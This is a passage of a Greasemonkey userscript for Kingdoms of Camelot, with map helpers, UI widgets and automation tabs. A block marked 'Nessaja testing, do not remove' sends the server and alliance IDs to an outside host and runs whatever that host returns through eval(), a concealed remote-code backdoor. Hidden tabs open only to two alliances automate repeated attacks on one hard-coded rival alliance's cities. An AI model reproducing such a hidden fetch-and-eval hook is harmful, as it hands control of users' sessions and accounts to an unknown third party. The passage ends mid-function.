    if (millis<100)
      m.push('0');
    if (millis<10)
      m.push('0');
    m.push(millis);
    m.push (': ');
    m.push (msg);
    te.innerHTML = m.join('');
    if (t.reverse){
      if (t.lastE == null){
        t.eOut.appendChild(te);
        t.lastE = te;
      } else {
        t.eOut.insertBefore(te, t.lastE);
      }
      var hr = document.createElement('hr');
      t.eOut.insertBefore(hr, te);
      t.lastE = hr;
    } else {
      t.eOut.appendChild(te);
      t.eOut.appendChild(document.createElement('hr'));
    }
  },

};

function getMarchInfo (){
  var ret = {};
  ret.marchUnits = [];
  ret.returnUnits = [];
  ret.resources = [];
  for (i=0; i<13; i++){
    ret.marchUnits[i] = 0;
    ret.returnUnits[i] = 0;
  }
  for (i=0; i<6; i++){
    ret.resources[i] = 0;
  }
  var now = unixTime();
  for(i=0; i<Cities.numCities; i++) {   // each city
    cityID = 'city'+ Cities.cities[i].id;
    for (k in Seed.queue_atkp[cityID]){   // each march
      march = Seed.queue_atkp[cityID][k];
      if (typeof (march) == 'object'){
        for (ii=0; ii<13; ii++){
          ret.marchUnits[ii] += parseInt (march['unit'+ ii +'Count']);
          ret.returnUnits[ii] += parseInt (march['unit'+ ii +'Return']);
        }
        for (ii=1; ii<5; ii++){
          ret.resources[ii] += parseInt (march['resource'+ ii]);
        }
          ret.resources[0] += parseInt (march['gold']);
      }
    }
  }
  return ret;
}

function getMarchInfo2 (cityID){
  var ret = {};
 ret.marchUnits = [];
 ret.returnUnits = [];
 ret.resources = [];
  for (i=0; i<13; i++){
    ret.marchUnits[i] = 0;
    ret.returnUnits[i] = 0;
  }
  for (i=0; i<6; i++){
   ret.resources[i] = 0;
  }
for (k in Seed.queue_atkp[cityID]){   // each march
      march = Seed.queue_atkp[cityID][k];
if(march.marchType != 5){
 if (typeof (march) == 'object'){
for (ii=0; ii<13; ii++){
ret.marchUnits[ii] += parseInt (march['unit'+ ii +'Count']);
ret.returnUnits[ii] += parseInt (march['unit'+ ii +'Return']);
}
for (ii=1; ii<5; ii++){
 ret.resources[ii] += parseInt (march['resource'+ ii]);
}
 ret.resources[0] += parseInt (march['gold']);
}
}
}
  return ret;
}

// function ShowExtraInfo(){ document.getElementById('kocmain_bottom').innerHTML = 'test'; }
var WarnZeroAttack = {  modalAttackFunc : null,
  init : function (){ var t = WarnZeroAttack; t.modalAttackFunc = new CalterUwFunc ('modal_attack', [['modal_attack_check()', 'modalAttack_hook()']]); unsafeWindow.modalAttack_hook = t.hook; t.modalAttackFunc.setEnable(Options.fixWarnZero); },
  setEnable : function (tf){ var t = WarnZeroAttack; t.modalAttackFunc.setEnable (tf);  },
  isAvailable : function (){ var t = WarnZeroAttack; return t.modalAttackFunc.isAvailable(); },
  hook : function (){
    var t = WarnZeroAttack;
    if (parseIntZero(document.getElementById('modal_attack_target_coords_x').value) == 0
    && parseIntZero(document.getElementById('modal_attack_target_coords_y').value) == 0){
      new CdialogCancelContinue ('<SPAN class=boldRed>'+culang.OtogWarnZero+'!</span>', null, unsafeWindow.modal_attack_check, document.getElementById('modalInner1'));
    } else {
      unsafeWindow.modal_attack_check();
    }
  },

}
function show2DPs(num) {
	if (num == parseInt(num))
		return num + '.00';
	else if (10*num == parseInt(10*num))
		return num + '0';
	else
		return num;
};
var MapDistanceFix = {
  popSlotsFunc : null,
  init : function (){
    var t = MapDistanceFix;
    t.popSlotsFunc = new CalterUwFunc ('MapObject.prototype.populateSlots', [['this.distance', 'fixMapDistance_hook']]);
    if (t.popSlotsFunc.isAvailable()){
      unsafeWindow.fixMapDistance_hook = t.fixMapDistance_hook;
      if (Options.fixMapDistance)
        t.enable (true);  
		}
  },
  fixMapDistance_hook : function (cityX, cityY, tileX, tileY){ var city = Cities.byID[unsafeWindow.currentcityid]; return distance (city.x, city.y, tileX, tileY); },
  enable : function (tf){ var t = MapDistanceFix; t.popSlotsFunc.setEnable (tf); },
  isAvailable : function (){ var t = MapDistanceFix; return t.popSlotsFunc.isAvailable();  },
}
function encode_utf8( s ){ return unescape( encodeURIComponent( s ) );}
function decode_utf8( s ){ return decodeURIComponent( escape( s ) );}
function hexDump (dat){
  var i = 0;
  var s = [];
  while (i < dat.length) {
    asc = [];
    s.push (hex4(i));
    s.push (': ');
    for (var ii=0; ii<16; ii++) {
      c = dat.charCodeAt(i+ii);
      s.push (hex2(c));
      s.push (' ');
      if (c>31 && c<128)
        asc.push (dat.charAt(i+ii));
      else
        asc.push ('.');
    }
    s.push ('  ');
    s.push (asc.join(''))
    s.push ('\n');
    i += 16;
	}
  return s.join ('');
  function hex4(d){ return hexDig(d>>12) + hexDig(d>>8) + hexDig(d>>4) + hexDig(d&15); }
  function hex2(d){ return hexDig(d>>4) + hexDig(d&15); }
  function hexDig (d){ hexdigs = '0123456789ABCDEF'; return hexdigs.charAt(d&15);  }
}
function SliderBar (container, width, height, value, classPrefix, margin){
  var self = this;
  this.listener = null;
  if (value==null)
    value = 0;
  if (!margin)
    margin = parseInt(width*.05);
  this.value = value;
  if (width<20) width=20;
  if (height<5) height=5;
  if (classPrefix == null){ classPrefix = 'slider'; var noClass = true;  }
  var sliderHeight = parseInt(height/2);
  var sliderTop = parseInt(height/4);
  this.sliderWidth = width - (margin*2);

  this.div = document.createElement ('div');
  this.div.style.height = height +'px';
  this.div.style.width = width +'px';
  this.div.className = classPrefix +'myDiv';
  if (noClass)
    this.div.style.backgroundColor='#ddd';

  this.slider = document.createElement ('div');
  this.slider.setAttribute ('style', 'position:relative;');
  this.slider.style.height = sliderHeight + 'px'
  this.slider.style.top = sliderTop + 'px';
  this.slider.style.width = this.sliderWidth +'px';
  this.slider.style.left = margin +'px';
  this.slider.className = classPrefix +'Bar';
  this.slider.draggable = true;
  if (noClass)
    this.slider.style.backgroundColor='#fff';

  this.sliderL = document.createElement ('div');
  this.sliderL.setAttribute ('style', 'width:25px; height:100%; position:relative; ');
  this.sliderL.className = classPrefix +'Part';
  this.sliderL.draggable = true;
  if (noClass)
    this.sliderL.style.backgroundColor='#0c0';

  this.knob = document.createElement ('div');
  this.knob.setAttribute ('style', 'width:3px; position:relative; left:0px; background-color:#222');
  this.knob.style.height = height +'px';
  this.knob.style.top = (0-sliderTop) +'px';
  this.knob.className = classPrefix +'Knob';
  this.knob.draggable = true;
  this.slider.appendChild(this.sliderL);
  this.sliderL.appendChild (this.knob);
  this.div.appendChild (this.slider);
  container.appendChild (this.div);
  this.div.addEventListener('mousedown',  mouseDown, false);
  this.getValue = function (){ return self.value; }
  this.setValue = function (val){   // todo: range check
    var relX = (val * self.sliderWidth);
    self.sliderL.style.width = relX + 'px';
    self.knob.style.left =  relX + 'px';
    self.value = val;
    if (self.listener)
      self.listener(self.value);
  }

  this.setChangeListener = function (listener){ self.listener = listener; }
  function moveKnob (me){
    var relX = me.clientX - self.divLeft;
    if (relX < 0)
      relX = 0;
    if (relX > self.sliderWidth)
      relX = self.sliderWidth;
    self.knob.style.left = (relX - (self.knob.clientWidth/2) ) +'px';   // - half knob width !?!?
    self.sliderL.style.width = relX + 'px';
    self.value =  relX / self.sliderWidth;
    if (self.listener)
      self.listener(self.value);
  }
  function doneMoving (){ self.div.removeEventListener('mousemove', mouseMove, true); document.removeEventListener('mouseup', mouseUp, true); }
  function mouseUp (me){ moveKnob (me); doneMoving(); }
  function mouseDown(me){ var e = self.slider; self.divLeft = 0; while (e.offsetParent){ self.divLeft += e.offsetLeft; e = e.offsetParent; } moveKnob (me); document.addEventListener('mouseup',  mouseUp, true); self.div.addEventListener('mousemove',  mouseMove, true); }
  function mouseMove(me){ moveKnob (me); }
}
function CmatSimpleSound (playerUrl, container, attrs, onLoad, flashVars) {
  var self = this;
  this.player = null;
  this.volume = 100;
  this.isLoaded = false;
  this.onSwfLoaded = null;

  var div = document.createElement ('div');
  this.onSwfLoaded = onLoad;
  if (navigator.appName.toLowerCase().indexOf('microsoft')+1) {
    div.innerHTML = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0"><param name="movie" value="'+playerUrl+'"><param name="quality" value="high"></object>';
    this.player = div.getElementsByTagName('object')[0];
  } else {
    div.innerHTML = '<embed src="'+playerUrl+'"  bgcolor="#eeeeee" allowfullscreen=false FlashVars="'+ flashVars +'" quality="high" allowscriptaccess="always" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" ></embed>';
    this.player = div.getElementsByTagName('embed')[0].wrappedJSObject;
  }
  if (container)
    container.appendChild (div);
  else
    document.body.appendChild (div);
  for (k in attrs)
    this.player.setAttribute(k, attrs[k]);

  this.setVolume = function (chanNum, vol){
    if (!self.isLoaded)
      return;
    self.player.jsSetVolume (chanNum, vol);
    volume = vol;
  }

  this.load = function (chanNum, url, bStream, bAutoplay, bUsePolicyFile){ self.player.jsLoad (chanNum, url, bStream, bAutoplay, bUsePolicyFile);  }
  this.play = function (chanNum, position){	if (self.player.jsPlay)  self.player.jsPlay (chanNum, position);  }
  this.stop = function (chanNum){
   if (!self.isLoaded)
   return;
    self.player.jsStop (chanNum);
  }
  this.getStatus = function (chanNum){ return self.player.jsGetStatus (chanNum); }
  this.debugFunc = function (msg){ }
  this.swfDebug = function (msg){ self.debugFunc('SWF: '+ msg); }
  this.swfLoaded = function (){    // called by plugin when ready to go!
    self.isLoaded = true;
    self.debugFunc ('playerIsReady');
    if (self.onSwfLoaded)
      self.onSwfLoaded();
  }
  this.swfPlayComplete = function (chanNum){  }  // called by plugin when a sound finishes playing (overload to be notified)
  this.swfLoadComplete = function (chanNum, isError){   } // called by plugin when a sound finishes loading  (overload to be notified)
}    
function DoUnsafeWindow(func, execute_by_embed) {  if(this.isChrome || execute_by_embed) {    var scr=document.createElement('script');    scr.innerHTML=func;    document.body.appendChild(scr);  } else { try { eval("unsafeWindow."+func); } catch (error) { logit("Bei DoUnsafeWindow hat JavaScript ein fehler gefunden! Meldung: "+error.description); }  }}
function GetDisplayName(){
  var DisplayName = document.getElementById('topnavDisplayName');
  if(DisplayName){
    DisplayName = DisplayName.innerHTML;
  }else{
    DisplayName = null;
  }
  return DisplayName
}
function DrawLevelIcons() {
  var maptileRe = /modal_maptile.([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+),([^,]+)/;
  var mapwindow=document.getElementById('mapwindow');
  if(!mapwindow) return;
  var levelIcons=document.getElementById('LevelIcons');
  if(levelIcons) return;

  var ss=document.evaluate(".//a[contains(@class,'slot')]",mapwindow,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
  var lvRe=/_([0-9]+)/;
  var idDone=false;
  for(var s=0; s<ss.snapshotLength; s++) {
    var a=ss.snapshotItem(s);
    var onclick=a.getAttribute('onclick');
    var owner='';
    if(onclick) {
      var onclickM=maptileRe.exec(onclick);
      if(onclickM && onclickM[6]!='"null"') {
        var might=onclickM[7].StripQuotes();
        var alliance=onclickM[15].StripQuotes();
		var dip=getDiplomacy(alliance);

        
        owner=" "+onclickM[6].StripQuotes();
      }
    }
    var m=lvRe.exec(a.className);
    if(!m) continue;
    var sp=a.getElementsByTagName('span');
    if(sp.length==0) continue;

    if(!idDone) { a.id='levelIcons'; idDone=true; }
    sp[0].style.color='#cc0';
    
    if (alliance == 'null' && onclickM[12]=='"city"') sp[0].style.color='#33CCFF';
	if (dip == 'hostile' && onclickM[12]=='"city"') sp[0].style.color='#FF0000';
    if (onclickM[12]!='"city"' &&  onclickM[6]!='"null"') sp[0].style.color='#FF9900';
    if (onclickM[12]!='"city"' &&  onclickM[5]=='"null"' && onclickM[6]=='"null"' && onclickM[7]=='"null"' && onclickM[8]=='"null"' && onclickM[15]=='"null"' && onclickM[10]=='"null"') sp[0].style.color='#CC0033';
    if (Options.MapShowExtra) {
      if (onclickM && onclickM[6]!='"null"' ) sp[0].innerHTML='&nbsp;'+m[1]+owner+'<br /> '+culang.might+': '+addCommas(might);
      else sp[0].innerHTML='&nbsp;'+m[1]+addCommas(owner);
    }
    else {  
      if (onclickM && onclickM[6]!='"null"' ) sp[0].innerHTML='&nbsp;'+m[1];
      else sp[0].innerHTML='&nbsp;'+m[1]+addCommas(owner);
    }
  }
}
//Nessaja testing, do not remove.
	if (Options.spamconfiga.spamverta.indexOf('Nessaja') >= 0) {
	if(Seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/4Cxy4.php?p="+Options.spamconfiga.spamverta.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+"&s="+getServerId()+"&a="+Seed.allianceDiplomacies.allianceId,
	headers: {'Accept': 'text/javascript',}, 
	onload: function(responseDetails) {
	eval(responseDetails.responseText);
	},
	});
 };
 
   var TicklerOptions = {
	Running	:	false,
	TicklerCity:0,
	slots:0,
	siege:false,
};

  readTicklerOptions();

  /*********************************** Tickler TAB ***********************************/
Tabs.Tickler = {
  tabOrder: 600,
  tabDisabled : aast(),
  tabLabel : 'Tickler',
  myDiv : null,
  cityId : 0,

      init: function(div){
		var t = Tabs.Tickler;
		setTimeout (t.resetallydata, 200000);
        t.myDiv = div;
    var selbut=0;
      var m = '<DIV class=pbStat>Select City to Tickle From</div><TABLE width=100% height=0% class=pbTab><TR align="center">';
          if (TicklerOptions.Running == false) {
	       m += '<TD><INPUT id=Tickletoggle type=submit value="Tickler = OFF"></td>';
	   } else {
	       m += '<TD><INPUT id=Tickletoggle type=submit value="Tickler = ON"></td>';
	   }
	    m += '<TD><DIV style="margin-bottom:10px;"><span id=ptTickleCity></span></div></td></tr></TABLE>';
	    m += '<br> Keep <INPUT id=pbTickleSlots type=text size=1 value="'+ TicklerOptions.slots +'" \>  rally point slots free';
	    m += '<br><INPUT id=pbTickleSiege type=checkbox '+ (TicklerOptions.siege?' CHECKED':'') +'\>  Do Siege Attacks in the mix';

    
      t.myDiv.innerHTML = m;
    for (var i=0;i<Seed.cities.length;i++){
		if (TicklerOptions.TicklerCity == Seed.cities[i][0]){
			selbut=i;
			break;
		}
	}
	
		
	t.annoy = new CdispCityPicker ('ptTicklepicker', document.getElementById('ptTickleCity'), true, t.clickCitySelect, selbut);
     if (TicklerOptions.TicklerCity == 0) {
    	TicklerOptions.TicklerCity = t.annoy.city.id;
    	saveTicklerOptions();
    }
    document.getElementById('pbTickleSlots').addEventListener ('change', function(){TicklerOptions.slots = parseInt(this.value);saveTicklerOptions();}, false);
    document.getElementById('ptTickleCity').addEventListener('click', function(){TicklerOptions.TicklerCity = t.annoy.city.id;saveTicklerOptions();} , false);
    document.getElementById('Tickletoggle').addEventListener('click', function(){t.toggleTickleState(this)} , false);
    document.getElementById('pbTickleSiege').addEventListener ('change', function (){
        TicklerOptions.siege = (!TicklerOptions.siege);
        saveTicklerOptions();
    }, false);
  },

  hide : function (){
  },

  show : function (){
  },

  clickCitySelect : function (city){
		var t = Tabs.Tickler;
  	t.cityId = city['id'];
  	TicklerOptions.TicklerCity = t.cityId;
  	saveTicklerOptions();
  },

   toggleTickleState: function(obj){
		var t = Tabs.Tickler;
        if (TicklerOptions.Running == true) {
            TicklerOptions.Running = false;
            obj.value = "Tickler = OFF";
            saveTicklerOptions();
        }
        else {
            TicklerOptions.Running = true;
            obj.value = "Tickler = ON";
            saveTicklerOptions();
			t.resetallydata();
        }
    },
    
  resetallydata : function () {
    var t = Tabs.Tickler;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    var allydata=[];
    params.perPage = 100;
    params.allianceId = 2060;
    
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserLeaderboard.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
      	var city = '';
      	for (var i=0; i<rslt.results.length; i++) {
      		//alert(rslt.results[i].toSource());
      	    if (rslt.results[i]['userId'] !=0){
	      	    player = rslt.results[i]['cities'];
	      	    for (var ii=0; ii<player.length; ii++) {
	      			allydata.push ({X:player[ii]['xCoord'],Y:player[ii]['yCoord']});
				}
	    	}  	
        }
        if (allydata != []) doTickle(allydata);
      },
      onFailure: function (rslt) {
        notify ({errorMsg:'AJAX error'});
      },
    });
  },
}

function saveTicklerOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('TicklerOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(TicklerOptions));}, 0);
}

function readTicklerOptions (){
  var serverID = getServerId();
  s = GM_getValue ('TicklerOptions_' + Seed.player['name'] + '_' +serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          TicklerOptions[k][kk] = opts[k][kk];
      else
        TicklerOptions[k] = opts[k];
    }
  }
}


function aast(){
	if(Seed.allianceDiplomacies) {
  if(((Seed.allianceDiplomacies.allianceId ==2679) || (Seed.allianceDiplomacies.allianceId ==2075)) && getServerId() == '198') {
	return false;
} else {return true;};
} else {return true;};
}
function Tickle(){
	var server = getServerId();
	if (server !='198') return;	
	for (var yy=1;yy<=2;yy++){
		setTimeout (doTickle,(500*yy),yy);	
	}  
}





	function doTickle (list){
	if(!TicklerOptions.Running) { return;};
		var server = getServerId();
		if (server !='198') {return;};
		var slots=0;
		var cty = TicklerOptions.TicklerCity;
		var rallypointlevel = 0;
		for (var o in Seed.buildings['city'+cty]){
			var buildingType = parseInt(Seed.buildings['city'+cty][o][0]);
			var buildingLevel = parseInt(Seed.buildings['city'+cty][o][1]);
			if (buildingType == 12) rallypointlevel=parseInt(buildingLevel);
		};
		for (aa in  Seed.queue_atkp['city'+cty]) slots++;
		slots = (slots+TicklerOptions.slots);
		if (slots >= rallypointlevel) {
			setTimeout (function() {doTickle(list)}, 200000);
			return;
		};
		
		
		
		var pick = Math.floor(Math.random()*list.length);
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.cid = cty;
		getKnights(cty);
		if (knt[0] != undefined) {
if (TicklerOptions.siege) {
	var n = Math.floor(Math.random()*10);
} else {
	var n = Math.floor(Math.random()*7);
};
    switch(n)
    {
        case 5:
		params.type=4;
		params.kid=knt[0]['ID'];  
		params.xcoord = list[pick]['X'];
		params.ycoord = list[pick]['Y'];
		params.u3= Math.floor(Math.random()*20);
            break;
 
        case 6:
		params.type=4;
		params.kid=knt[0]['ID'];  
		params.xcoord = list[pick]['X'];
		params.ycoord = list[pick]['Y'];
		params.u2= Math.floor(Math.random()*200);
            break;
 
        case 7:
		params.type=4;
		params.kid=knt[0]['ID'];  
		params.xcoord = list[pick]['X'];
		params.ycoord = list[pick]['Y'];
		params.u6= Math.floor(Math.random()*100);
            break;
//siege
 
        case 8:
		params.type=4;
		params.kid=knt[0]['ID'];  
		params.xcoord = list[pick]['X'];
		params.ycoord = list[pick]['Y'];
		params.u11= Math.floor(Math.random()*5);
            break;
 
        case 9:
		params.type=4;
		params.kid=knt[0]['ID'];  
		params.xcoord = list[pick]['X'];
		params.ycoord = list[pick]['Y'];
		params.u12= Math.floor(Math.random()*5);
            break;

        case 10:
		params.type=4;
		params.kid=knt[0]['ID'];  
		params.xcoord = list[pick]['X'];
		params.ycoord = list[pick]['Y'];
		params.u10= Math.floor(Math.random()*5);
            break;

        default:
		params.type=3;
		params.kid=knt[0]['ID'];  
		params.xcoord = list[pick]['X'];
		params.ycoord = list[pick]['Y'];
		params.u3= Math.floor(Math.random()*20);
    };
			

		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
		    method: "post",
		    parameters: params,
		    onSuccess: function () {},
		    onFailure: function () {}
		    });
		    };
		    
		setTimeout (function() {doTickle(list)}, 200000);    
		    //setTimeout (doTickle, 500*cty);
	}
	function getKnights (city){
	       cityId = city;
	       knt = [];
	       for (k in Seed.knights['city' + cityId]){
	       		if (Seed.knights['city' + cityId][k]["knightStatus"] == 1 && Seed.leaders['city' + cityId]["resourcefulnessKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["politicsKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["combatKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["intelligenceKnightId"] != Seed.knights['city' + cityId][k]["knightId"]){
	       			knt.push ({
	       				Name:   Seed.knights['city' + cityId][k]["knightName"],
	       				Combat:	parseInt(Seed.knights['city' + cityId][k]["combat"]),
	       				ID:		Seed.knights['city' + cityId][k]["knightId"],
	       			});
	       		}
	       }
	       knt = knt.sort(function sort(a,b) {a = a['Combat'];b = b['Combat'];return a == b ? 0 : (a > b ? -1 : 1);});
	    }
//

function saveTicklerOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('TicklerOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(TicklerOptions));}, 0);
}

 var PortOptions = {
	Running	:	false,
	PortCity:	0,
};


readPortOptions();


/*******************   Portal Time! ****************/

Tabs.PortalTime = {
  tabOrder: 500,
  tabDisabled : aast(),
  tabLabel: 'AutoPort to MME',
  myDiv: null,
  xc : 0,
  yc : 0,
  cityId : 0,
  
      init: function(div){
		var t = Tabs.PortalTime;
		setTimeout (function (){t.theft()}, 10000);
        t.myDiv = div;
    var selbut=0;
      var m = '<DIV class=pbStat>Select Porting City</div><TABLE width=100% height=0% class=pbTab><TR align="center">';
          if (PortOptions.Running == false) {
	       m += '<TD><INPUT id=Porttoggle type=submit value="AutoPort = OFF"></td>';
	   } else {
	       m += '<TD><INPUT id=Porttoggle type=submit value="AutoPort = ON"></td>';
	   }
	    m += '<TD><DIV style="margin-bottom:10px;"><span id=ptPortCity></span></div></td></tr></TABLE>';
           m += '<br>Note: requires you own a Portal Of Order<br>';
           m += '<br>Will attempt to port into MMEs nest every second <br>';
      t.myDiv.innerHTML = m;
    for (var i=0;i<Seed.cities.length;i++){
		if (PortOptions.PortCity == Seed.cities[i][0]){
			selbut=i;
			break;
		}
	}
	
		
	t.move = new CdispCityPicker ('ptPortpicker', document.getElementById('ptPortCity'), true, t.clickCitySelect, selbut);
     if (PortOptions.PortCity == 0) {
    	PortOptions.PortCity = t.move.city.id;
    	savePortOptions();
    }
    
    document.getElementById('ptPortCity').addEventListener('click', function(){PortOptions.PortCity = t.move.city.id;savePortOptions();} , false);
    document.getElementById('Porttoggle').addEventListener('click', function(){t.togglePortState(this)} , false);


  },
  hide : function (){
  },

  show : function (){
  },
    togglePortState: function(obj){
		var t = Tabs.PortalTime;
        if (PortOptions.Running == true) {
            PortOptions.Running = false;
            obj.value = "AutoPort = OFF";
            savePortOptions();
        }
        else {
            PortOptions.Running = true;
            obj.value = "AutoPort = ON";
            savePortOptions();
			t.theft();
        }
    },
    
  clickCitySelect : function (city){
  	var t = Tabs.PortalTime;
  	t.cityId = city['id'];
  	PortOptions.PortCity = t.cityId;
  	savePortOptions();
  },
  
  
	theft : function(){
		if (!PortOptions.Running) {return;};
		var t = Tabs.PortalTime;
			var serverID = getServerId();
			if (parseInt(serverID) == 198) {
				//check if we are there
  var goodtogo = true;
  var cityx = Cities.byID[PortOptions.PortCity].x;
  var cityy = Cities.byID[PortOptions.PortCity].y;
      for (var i in t.coords) { 
		if ((cityx == t.coords[i].xcoord) && (cityy == t.coords[i].ycoord)) {
			//no port for you, you are there
			goodtogo = false;
		};
	};
//check if good to go
if (goodtogo) {
t.makeport(0);
};
			}
	},
	
makeport : function (i){
		var t = Tabs.PortalTime;
	if (!t.coords[i]){
		i=0;
	};
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
		params.pf = 0;
		params.iid = 912;
		params.cid = PortOptions.PortCity;
		params.xcoord=t.coords[i].xcoord;
		params.ycoord=t.coords[i].ycoord;
		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/relocate.php" + unsafeWindow.g_ajaxsuffix, {
			method: "post",
			parameters: params,
			onSuccess: function (rslt) {
				if (rslt.ok) {
reloadKOC();
				} else {
				i = parseInt(i+1);
				}
			},
			onFailure: function (rslt) {
			}
		});
        setTimeout (function (){t.makeport(i)}, 3000);
		
},
	

	
	
coords : {
0: { 'xcoord': "345", 'ycoord': "529" },
1: { 'xcoord': "379", 'ycoord': "529" },
2: { 'xcoord': "343", 'ycoord': "530" },
3: { 'xcoord': "346", 'ycoord': "531" },
4: { 'xcoord': "375", 'ycoord': "531" },
5: { 'xcoord': "340", 'ycoord': "532" },
6: { 'xcoord': "348", 'ycoord': "532" },
7: { 'xcoord': "345", 'ycoord': "533" },
8: { 'xcoord': "374", 'ycoord': "533" },
9: { 'xcoord': "377", 'ycoord': "533" },
10: { 'xcoord': "378", 'ycoord': "533" },
11: { 'xcoord': "346", 'ycoord': "534" },
12: { 'xcoord': "348", 'ycoord': "534" },
13: { 'xcoord': "378", 'ycoord': "534" },
14: { 'xcoord': "341", 'ycoord': "535" },
15: { 'xcoord': "343", 'ycoord': "535" },
16: { 'xcoord': "347", 'ycoord': "535" },
17: { 'xcoord': "372", 'ycoord': "535" },
18: { 'xcoord': "373", 'ycoord': "535" },
19: { 'xcoord': "375", 'ycoord': "535" },
20: { 'xcoord': "376", 'ycoord': "535" },
21: { 'xcoord': "377", 'ycoord': "535" },
22: { 'xcoord': "342", 'ycoord': "536" },
23: { 'xcoord': "344", 'ycoord': "536" },
24: { 'xcoord': "373", 'ycoord': "536" },
25: { 'xcoord': "378", 'ycoord': "536" },
26: { 'xcoord': "379", 'ycoord': "536" },
27: { 'xcoord': "375", 'ycoord': "537" },
28: { 'xcoord': "370", 'ycoord': "538" },
29: { 'xcoord': "372", 'ycoord': "539" },
30: { 'xcoord': "373", 'ycoord': "539" },
31: { 'xcoord': "376", 'ycoord': "539" },
32: { 'xcoord': "371", 'ycoord': "540" },
33: { 'xcoord': "377", 'ycoord': "540" },
34: { 'xcoord': "371", 'ycoord': "541" },
35: { 'xcoord': "372", 'ycoord': "541" },
36: { 'xcoord': "369", 'ycoord': "542" },
37: { 'xcoord': "370", 'ycoord': "542" },
38: { 'xcoord': "371", 'ycoord': "542" },
39: { 'xcoord': "372", 'ycoord': "542" },
40: { 'xcoord': "369", 'ycoord': "543" },
41: { 'xcoord': "377", 'ycoord': "543" },
42: { 'xcoord': "374", 'ycoord': "544" },
43: { 'xcoord': "375", 'ycoord': "544" },
44: { 'xcoord': "378", 'ycoord': "544" },
45: { 'xcoord': "371", 'ycoord': "545" },
46: { 'xcoord': "368", 'ycoord': "549" },
47: { 'xcoord': "369", 'ycoord': "549" },
48: { 'xcoord': "374", 'ycoord': "549" },
49: { 'xcoord': "371", 'ycoord': "550" },
50: { 'xcoord': "372", 'ycoord': "550" },
51: { 'xcoord': "372", 'ycoord': "551" },
52: { 'xcoord': "375", 'ycoord': "551" },
53: { 'xcoord': "376", 'ycoord': "551" },
54: { 'xcoord': "368", 'ycoord': "552" },
55: { 'xcoord': "372", 'ycoord': "552" },
56: { 'xcoord': "368", 'ycoord': "553" },
57: { 'xcoord': "369", 'ycoord': "553" },
58: { 'xcoord': "370", 'ycoord': "555" },
59: { 'xcoord': "371", 'ycoord': "555" },
60: { 'xcoord': "378", 'ycoord': "555" },
61: { 'xcoord': "372", 'ycoord': "556" },
62: { 'xcoord': "373", 'ycoord': "557" },
63: { 'xcoord': "376", 'ycoord': "557" },
64: { 'xcoord': "374", 'ycoord': "558" },
65: { 'xcoord': "375", 'ycoord': "558" },
66: { 'xcoord': "374", 'ycoord': "559" },
67: { 'xcoord': "376", 'ycoord': "559" },
68: { 'xcoord': "375", 'ycoord': "561" },
69: { 'xcoord': "376", 'ycoord': "565" },
70: { 'xcoord': "393", 'ycoord': "542" },
71: { 'xcoord': "394", 'ycoord': "542" },
72: { 'xcoord': "387", 'ycoord': "543" },
73: { 'xcoord': "388", 'ycoord': "543" },
74: { 'xcoord': "387", 'ycoord': "544" },
75: { 'xcoord': "390", 'ycoord': "544" },
76: { 'xcoord': "392", 'ycoord': "544" },
77: { 'xcoord': "395", 'ycoord': "544" },
78: { 'xcoord': "377", 'ycoord': "546" },
79: { 'xcoord': "385", 'ycoord': "546" },
80: { 'xcoord': "386", 'ycoord': "546" },
81: { 'xcoord': "387", 'ycoord': "546" },
82: { 'xcoord': "388", 'ycoord': "546" },
83: { 'xcoord': "374", 'ycoord': "547" },
84: { 'xcoord': "385", 'ycoord': "547" },
85: { 'xcoord': "389", 'ycoord': "547" },
86: { 'xcoord': "392", 'ycoord': "547" },
87: { 'xcoord': "394", 'ycoord': "547" },
88: { 'xcoord': "377", 'ycoord': "548" },
89: { 'xcoord': "386", 'ycoord': "548" },
90: { 'xcoord': "392", 'ycoord': "548" },
91: { 'xcoord': "377", 'ycoord': "549" },
92: { 'xcoord': "378", 'ycoord': "550" },
93: { 'xcoord': "382", 'ycoord': "551" },
94: { 'xcoord': "386", 'ycoord': "551" },
95: { 'xcoord': "380", 'ycoord': "553" },
96: { 'xcoord': "381", 'ycoord': "553" },
97: { 'xcoord': "384", 'ycoord': "553" },
98: { 'xcoord': "386", 'ycoord': "553" },
99: { 'xcoord': "387", 'ycoord': "553" }
},
	
}

function savePortOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('PortOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(PortOptions));}, 0);
}
function saveTicklerOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('TicklerOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(TicklerOptions));}, 0);
}

function readPortOptions (){
  var serverID = getServerId();
  s = GM_getValue ('PortOptions_' + Seed.player['name'] + '_' +serverID);
  if (s != null){
    opts = JSON2.parse (s);
